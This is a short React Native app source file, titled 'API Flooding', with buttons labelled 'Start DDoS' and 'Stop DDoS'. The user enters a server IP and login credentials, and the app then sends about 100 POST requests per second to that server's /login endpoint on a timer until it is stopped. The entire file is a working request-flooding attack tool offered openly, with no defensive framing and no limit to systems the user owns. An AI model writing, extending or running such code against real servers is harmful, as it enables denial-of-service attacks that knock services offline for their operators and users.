import React, { useState } from 'react';
import { View, Text, TextInput, Button, Alert, StyleSheet } from 'react-native';

export default function App() {
  const [ip, setIp] = useState('');
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [intervalId, setIntervalId] = useState(null);

  const sendRequest = async () => {
    try {
      const res = await fetch(`http://${ip}:5000/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password }),
      });

      const data = await res.json();
      console.log(data);
    } catch (err) {
      console.error(err);
    }
  };

  const startFlood = () => {
    if (intervalId) return;
    const id = setInterval(sendRequest, 10); // ~100 requests/sec
    setIntervalId(id);
  };

  const stopFlood = () => {
    clearInterval(intervalId);
    setIntervalId(null);
  };

  const safeSend = () => {
    sendRequest();
  };

  return (
    <View style={styles.container}>
      <Text style={styles.title}>API Flooding</Text>
      <TextInput
        placeholder="Server IP"
        onChangeText={setIp}
        style={styles.input}
      />
      <TextInput
        placeholder="Username"
        onChangeText={setUsername}
        style={styles.input}
      />
      <TextInput
        placeholder="Password"
        secureTextEntry
        onChangeText={setPassword}
        style={styles.input}
      />
      <Button title="Start DDoS" onPress={startFlood} />
      <Button title="Stop DDoS" onPress={stopFlood} color="orange" />
      <Button title="Safe Send" onPress={safeSend} color="green" />
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, padding: 20, justifyContent: 'center' },
  title: { fontSize: 24, marginBottom: 20 },
  input: { borderWidth: 1, padding: 10, marginBottom: 10 },
});
